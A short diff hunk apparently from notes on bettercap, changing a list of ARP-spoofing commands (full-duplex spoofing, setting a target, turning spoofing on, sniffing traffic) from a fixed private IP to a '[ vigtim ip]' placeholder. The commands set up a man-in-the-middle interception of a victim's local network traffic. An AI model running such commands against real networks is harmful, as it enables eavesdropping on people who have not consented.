@@ -9,8 +9,8 @@
     help arp.spoof
     arp.spoof.fullduplex true 
     
-    arp.spoof.targets 192.168.0.165 
-    arp.spoof on
+    set arp.spoof.targets [ vigtim ip]
+    set arp.spoof on
     net.sniff on
 
     
